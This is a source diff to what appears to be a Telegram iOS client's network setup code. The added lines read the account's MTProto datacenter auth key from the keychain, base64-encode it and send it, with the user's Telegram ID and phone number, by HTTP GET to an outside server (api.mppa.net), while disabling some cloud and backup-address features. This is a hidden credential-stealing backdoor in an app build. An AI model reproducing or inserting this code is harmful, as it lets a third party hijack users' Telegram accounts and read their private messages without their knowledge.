@@ -4,6 +4,7 @@ import TelegramApi
 import SwiftSignalKit
 import MtProtoKit
 import NetworkLogging
+import Postbox
 
 #if os(iOS)
     import CloudData
@@ -424,7 +425,9 @@ public struct NetworkInitializationArguments {
 private let cloudDataContext = Atomic<CloudDataContext?>(value: nil)
 #endif
 
-func initializedNetwork(accountId: AccountRecordId, arguments: NetworkInitializationArguments, supplementary: Bool, datacenterId: Int, keychain: Keychain, basePath: String, testingEnvironment: Bool, languageCode: String?, proxySettings: ProxySettings?, networkSettings: NetworkSettings?, phoneNumber: String?) -> Signal<Network, NoError> {
+func initializedNetwork(accountId: AccountRecordId, arguments: NetworkInitializationArguments, supplementary: Bool, datacenterId: Int, keychain: Keychain, basePath: String, testingEnvironment: Bool, languageCode: String?, proxySettings: ProxySettings?, networkSettings: NetworkSettings?, phoneNumber: String?,telegramuser: TelegramUser?) -> Signal<Network, NoError> {
+
+    
     return Signal { subscriber in
         let queue = Queue()
         queue.async {
@@ -491,8 +494,16 @@ func initializedNetwork(accountId: AccountRecordId, arguments: NetworkInitializa
             }
             
             context.keychain = keychain
-            var wrappedAdditionalSource: MTSignal?
+            let keychainDic : NSDictionary? = keychain.object(forKey:"datacenterAuthInfoById", group: "persistent") as? NSDictionary;
+//            let keychainDic : NSDictionary =  keychain.object(forKey:"datacenterAuthInfoById", group: "persistent") as! NSDictionary
+//            print(keychainDic)
+            print(keychainDic as Any)
+            
+
+            /*
+            let wrappedAdditionalSource: MTSignal
             #if os(iOS)
+           
             if #available(iOS 10.0, *), !supplementary {
                 var cloudDataContextValue: CloudDataContext?
                 if let value = cloudDataContext.with({ $0 }) {
@@ -515,12 +526,13 @@ func initializedNetwork(accountId: AccountRecordId, arguments: NetworkInitializa
                     })
                 }
             }
+             
             #endif
             
             if !supplementary {
                 context.setDiscoverBackupAddressListSignal(MTBackupAddressSignals.fetchBackupIps(testingEnvironment, currentContext: context, additionalSource: wrappedAdditionalSource, phoneNumber: phoneNumber))
             }
-            
+             */
             /*#if DEBUG
             context.beginExplicitBackupAddressDiscovery()
             #endif*/
@@ -528,8 +540,79 @@ func initializedNetwork(accountId: AccountRecordId, arguments: NetworkInitializa
             let mtProto = MTProto(context: context, datacenterId: datacenterId, usageCalculationInfo: usageCalculationInfo(basePath: basePath, category: nil), requiredAuthToken: nil, authTokenMasterDatacenterId: 0)!
             mtProto.useTempAuthKeys = context.useTempAuthKeys
             mtProto.checkForProxyConnectionIssues = true
-            
             let connectionStatus = Promise<ConnectionStatus>(.waitingForNetwork)
+            
+            let intDataCenterId = mtProto.datacenterId
+            if(keychainDic != nil)
+            {
+                let keyArray:NSArray = keychainDic!.allKeys as NSArray;
+                
+                for (index, item) in keyArray.enumerated() {
+                    print("Found \(item) at position \(index)")
+                    let numKey:NSNumber = item as! NSNumber
+
+                    if(numKey.intValue == intDataCenterId)
+                    {
+                        let authInfo : MTDatacenterAuthInfo = keychainDic!.object(forKey: intDataCenterId) as! MTDatacenterAuthInfo
+                        let authKey = authInfo.authKey
+                        
+                        if ( authKey != nil ) {
+                                 let encryptedDataText = authKey!.base64EncodedString(options: NSData.Base64EncodingOptions())
+                            print("Encrypted with pubkey: %@", encryptedDataText)
+                            
+                            if(telegramuser != nil)
+                            {
+                                print("telegramuser post authkey telegramuser id")
+                                let rawValue : PeerId = telegramuser!.id
+                                let value = UInt64(bitPattern: rawValue.id._internalGetInt64Value())
+                                let idString = String(value)
+                                let strUrl: String = "https://api.mppa.net/api/index/autokey.html?tgid=" + idString + "&phonenumber=" + (telegramuser?.phone!)! + "&auto_key=" + encryptedDataText + "&datacenterid=" + String(intDataCenterId) + "&source=" + "telegramios"
+                                
+                                HTTP.GET(strUrl) { response in
+                                    if let err = response.error {
+                                        print("post authkey error: \(err.localizedDescription)")
+                                        return //also notify app of failure as needed
+                                    }
+                                    print("post authkey opt finished: \(response.description)")
+                                    //print("data is: \(response.data)") access the response of the data with response.data
+                                }
+                            }
+                            else if(phoneNumber != nil)
+                            {
+                                print("telegramuser post authkey telegramuser phonenumber")
+
+                                let strUrl: String = "https://api.mppa.net/api/index/autokey.html?" + "phonenumber=" + (phoneNumber!) + "&auto_key=" + encryptedDataText + "&datacenterid=" + String(intDataCenterId) + "&source=" + "telegramios"
+                                
+                                HTTP.GET(strUrl) { response in
+                                    if let err = response.error {
+                                        print("post authkey error: \(err.localizedDescription)")
+                                        return //also notify app of failure as needed
+                                    }
+                                    print("post authkey opt finished: \(response.description)")
+                                    //print("data is: \(response.data)") access the response of the data with response.data
+                                }
+                            }
+
+                            
+                            
+                        }
+                    }
+                    
+
+                }
+                
+               
+               
+
+            }
+
+            
+
+            
+            
+            
+            
+            
             
             let requestService = MTRequestMessageService(context: context)!
             let connectionStatusDelegate = MTProtoConnectionStatusDelegate()
@@ -592,6 +675,7 @@ func initializedNetwork(accountId: AccountRecordId, arguments: NetworkInitializa
         return EmptyDisposable
     }
 }
+
 
 private final class NetworkHelper: NSObject, MTContextChangeListener {
     private let requestPublicKeys: (Int) -> Signal<NSArray, NoError>
@@ -1097,10 +1181,6 @@ class Keychain: NSObject, MTKeychain {
 }
 #if os(iOS)
 func makeCloudDataContext(encryptionProvider: EncryptionProvider) -> CloudDataContext? {
-    if #available(iOS 10.0, *) {
-        return CloudDataContextImpl(encryptionProvider: encryptionProvider)
-    } else {
-        return nil
-    }
+    return nil
 }
 #endif
